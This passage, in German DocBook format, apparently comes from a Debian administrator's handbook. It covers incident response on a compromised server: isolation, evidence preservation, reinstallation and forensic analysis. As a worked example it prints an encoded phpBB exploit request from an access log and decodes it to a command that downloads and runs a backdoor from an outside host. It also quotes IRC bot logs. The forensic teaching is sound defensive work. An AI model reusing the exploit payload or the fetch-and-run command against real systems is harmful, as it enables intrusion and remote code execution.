      <para>Außer in sehr ungewöhnlichen Fällen erfolgt ein Einbruch über das Netzwerk, und der Angreifer benötigt ein funktionierendes Netzwerk, um seine Ziele zu erreichen (auf vertrauliche Daten zuzugreifen, illegale Dateien zu tauschen, seine Identität durch die Verwendung des Rechners als Zwischenstation zu verbergen und so weiter). Dadurch dass der Rechner vom Netz genommen wird, wird es dem Angreifer unmöglich gemacht, diese Ziele zu erreichen, falls ihm dies bisher noch nicht gelungen ist.</para>

      <para>Dies ist nur möglich, wenn der Server physisch zugänglich ist. Falls sich der Server im Datencenter eines Hosting-Anbieters am anderen Ende des Landes befindet, oder falls der Server aus einem anderen Grund nicht zugänglich ist, ist es gewöhnlich ratsam, als erstes einige wichtige Informationen zu sammeln (siehe <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> und <xref linkend="sect.reconstituting-the-attack-scenario" />), und dann den Server so weit wie möglich zu isolieren, indem möglichst viele Dienste abgeschaltet werden (normalerweise alles außer <command>sshd</command>). Diese Situation ist dennoch weiterhin gefährlich, da nicht ausgeschlossen werden kann, dass der Angreifer in gleicher Weise wie der Administrator SSH-Zugriff hat; dies macht es schwieriger, den Rechner zu „reinigen“.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Alles aufbewahren, was als Beweis dienen könnte</title>

      <para>Um den Angriff verstehen oder um rechtliche Schritte gegen die Angreifer einleiten zu können, ist es erforderlich, Kopien aller wichtigen Elemente zu erstellen; hierzu gehört der Inhalt der Festplatte, eine Liste aller laufenden Prozesse und eine Liste aller offenen Verbindungen. Der Inhalt des RAM könnte auch verwendet werden, er wird in der Praxis aber selten benutzt.</para>

      <para>Im Eifer des Gefechts sind Administratoren häufig versucht, auf dem kompromittierten Rechner zahlreiche Überprüfungen durchzuführen; dies ist jedoch gewöhnlich keine gute Idee. Jeder Befehl kann unterwandert sein und daher Beweisstücke löschen. Die Überprüfungen sollten auf ein Mindestmaß beschränkt werden (<command>netstat -tupan</command> für Netzwerkverbindungen, <command>ps auxf</command> für eine Liste der Prozesse, <command>ls -alR /proc/[0-9]*</command> für einige zusätzliche Informationen über laufende Programme), und jede durchgeführte Überprüfung sollte sorgfältig notiert werden.</para>

      <sidebar>
        <title><emphasis>VORSICHT</emphasis> Analyse unter Spannung</title>

	<para>Obwohl es verlockend sein mag, das System zu analysieren, während es läuft, sollte dies unterlassen werden, vor allem, wenn der Server physisch nicht erreichbar ist: Sie können einfach den Programmen, die zur Zeit auf dem kompromittierten System installiert sind, nicht trauen. Es ist gut möglich, dass ein unterwanderter <command>ps</command>-Befehl einige Prozesse verbirgt, oder dass ein unterwanderter <command>ls</command>-Befehl Dateien verbirgt; manchmal ist sogar der Kernel kompromittiert!</para>

	<para>Falls eine solche Analyse „unter Spannung“ dennoch notwendig ist, sollte darauf geachtet werden, nur bekanntermaßen einwandfreie Programme zu benutzen. Eine gute Möglichkeit dies zu tun besteht darin, eine Rettungs-CD mit einwandfreien Programmen zu verwenden oder eine schreibgeschützte Netzwerkfreigabe. Jedoch könnten selbst diese Gegenmaßnahmen nicht ausreichend sein, falls der Kernel selbst kompromittiert ist.</para>
      </sidebar>

      <para>Sobald die „dynamischen“ Elemente gespeichert sind, wird im nächsten Schritt ein vollständiges Abbild der Festplatte gespeichert. Die Erstellung eines derartigen Abbildes ist nicht möglich, solange sich das Dateisystem noch verändert. Deshalb muss es schreibgeschützt neu eingehängt werden. Die einfachste Lösung besteht häufig darin, den Server brutal anzuhalten (nachdem der Befehl <command>sync</command> ausgeführt wurde) und dann den Rechner mit einer Rettungs-CD neu zu starten. Jede Partition sollte mit einem Hilfsprogramm wie <command>dd</command> kopiert werden; diese Abbilder können zu einem anderen Server geschickt werden (zum Beispiel mit dem sehr praktischen Hilfsprogramm <command>nc</command>). Eine andere Möglichkeit ist eventuell noch einfacher: nehmen Sie einfach die Festplatte aus dem Rechner und ersetzen Sie sie durch eine neue, die neu formatiert und installiert werden kann.</para>
    </section>
    <section>
      <title>Neu installieren</title>
      <indexterm><primary>Hintertür</primary></indexterm>

      <para>Der Server sollte ohne eine vollständige Neuinstallation nicht wieder ans Netz gebracht werden. Falls die Kompromittierung schwerwiegend war (falls administrative Rechte erlangt worden sind), gibt es fast keinen anderen Weg, um sicher zu sein, dass wir von allem, was der Angreifer hinterlassen haben könnte (vor allem <emphasis>Hintertüren</emphasis>), befreit sind. Selbstverständlich müssen auch die jüngsten Sicherheitsaktualisierungen angewendet werden, um so die Sicherheitslücke zu schließen, die vom Angreifer benutzt wurde. Idealerweise sollte die Analyse des Angriffs diesen Angriffsvektor aufzeigen, so dass man sicher sein kann, dass man ihn behoben hat; sonst kann man nur hoffen, dass die Sicherheitslücke eine von denen war, die durch die Aktualisierungen beseitigt worden sind.</para>

      <para>Es ist nicht immer einfach, einen entfernten Server neu zu installieren; hierzu kann es erforderlich sein, Unterstützung vom Hosting-Unternehmen zu bekommen, da nicht alle derartigen Unternehmen automatische Reinstallationssysteme anbieten. Es sollte darauf geachtet werden, den Rechner nicht von Sicherheitskopien zu reinstallieren, die nach dem Beginn der Kompromittierung gezogen worden sind. Idealerweise sollten nur Daten wiederhergestellt werden, wohingegen die eigentliche Software von den Installationsmedien neu installiert wird.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Forensische Analyse</title>

      <para>Nun, da der Betrieb wiederhergestellt ist, ist es an der Zeit, sich die Abbilder des kompromittierten Systems genauer anzusehen, um den Angriffsvektor zu verstehen. Beim Einhängen dieser Abbilder sollte darauf geachtet werden, dass die Optionen <literal>ro,nodev,noexec,noatime</literal> verwendet werden, um zu verhindern, dass der Inhalt verändert wird (einschließlich der Zeitstempel für den Zugriff auf Dateien) oder versehentlich kompromittierte Programme ausgeführt werden.</para>

      <para>Ein Angriffsszenarium zurückzuverfolgen bedeutet gewöhnlich, nach allem Ausschau zu halten, das verändert und ausgeführt wurde:</para>
      <itemizedlist>
        <listitem>
	  <para><filename>.bash_history</filename>-Dateien stellen häufig eine sehr interessante Lektüre dar;</para>
        </listitem>
        <listitem>
	  <para>das Gleiche gilt für Dateien, die vor kurzem erstellt, verändert oder angesteuert wurden;</para>
        </listitem>
        <listitem>
	  <para>der Befehl <command>strings</command> hilft dabei, vom Angreifer installierte Programme zu identifizieren, indem er Textstrings aus einer Binärdatei extrahiert;</para>
        </listitem>
        <listitem>
	  <para>die Protokolldateien in <filename>/var/log/</filename> ermöglichen es oft, eine Chronologie der Ereignisse zu rekonstruieren;</para>
        </listitem>
        <listitem>
	  <para>Spezialprogramme ermöglichen es auch, den Inhalt von Dateien wiederherzustellen, die möglicherweise gelöscht worden sind, einschließlich der Protokolldateien, die Angreifer häufig löschen.</para>
        </listitem>
      </itemizedlist>

      <para>Einige dieser Vorgänge können durch spezielle Software einfacher gemacht werden. Insbesondere das Paket <emphasis role="pkg">sleuthkit</emphasis> bietet viele weitere Hilfsprogramme zur Analyse eines Dateisystems. Ihre Benutzung wird durch die grafische Schnittstelle <emphasis>Autopsy Forensic Browser</emphasis> (im Paket <emphasis role="pkg">autopsy</emphasis>) erleichtert.</para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Das Angriffsszenarium wiederherstellen</title>

      <para>Alle während der Analyse gesammelten Elemente sollten wie die Teile eines Puzzles zueinander passen; die Erstellung der ersten verdächtigen Dateien steht häufig mit Protokollen in Zusammenhang, die den Einbruch bekunden. Ein Beispiel aus dem Alltag sollte deutlicher sein, als langes theoretisches Gerede.</para>

      <para>Das folgende Protokoll ist ein Auzug aus einer Apache <filename>access.log</filename>-Datei:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>Dieses Beispiel entspricht einer alten Sicherheitslücke in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>Das Entschlüsseln dieser langen URL führt zu der Erkenntnis, dass es dem Angreifer gelungen ist, einigen PHP-Code auszuführen, nämlich: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. In der Tat wurde eine <filename>bd</filename>-Datei in <filename>/tmp/</filename> gefunden. Wenn man <command>strings /mnt/tmp/bd</command> ausführt, ergibt sich unter anderem der String <literal>PsychoPhobia Backdoor is starting...</literal>. Dies sieht wirklich nach einer Hintertür aus.</para>

      <para>Einige Zeit später wurde dieser Zugang dazu benutzt, einen IRC-<emphasis>Bot</emphasis> herunterzuladen, zu installieren und auszuführen, der sich mit einem IRC-Untergrundnetzwerk verbunden hat. Der Bot konnte dann über dieses Protokoll gesteuert und angewiesen werden, Dateien zum Tausch herunterzuladen. Dieses Programm hat sogar seine eigene Programmdatei:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>Diese Spuren zeigen, dass über die IP-Adresse 82.50.72.202 zwei Videodateien auf dem Server gespeichert wurden.</para>

      <para>Gleichzeitig hat der Angreifer einige zusätzliche Dateien heruntergeladen: <filename>/tmp/pt</filename> und <filename>/tmp/loginx</filename>. Lässt man diese Dateien durch <command>strings</command> laufen, so ergeben sich Strings wie <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> und <foreignphrase>Now wait for suid shell...</foreignphrase>. Diese sehen wie Programme aus, die lokale Schwachstellen ausnutzen, um Administratorrechte zu erlangen. Haben sie ihr Ziel erreicht? In diesem Fall vermutlich nicht, da anscheinend keine Datei nach dem ursprünglichen Einbruch verändert worden ist.</para>

      <para>In diesem Beispiel wurde der gesamte Einbruch rekonstruiert, und es kann daraus geschlossen werden, dass der Angreifer in der Lage war, das kompromittierte System etwa drei Tage lang zu nutzen; aber das wichtigste Element der Analyse ist, dass die Schwachstelle identifiziert worden ist, und dass der Administrator sicher sein kann, dass die neue Installation diese Schwachstelle tatsächlich behebt.</para>
    </section>
  </section>
</chapter>
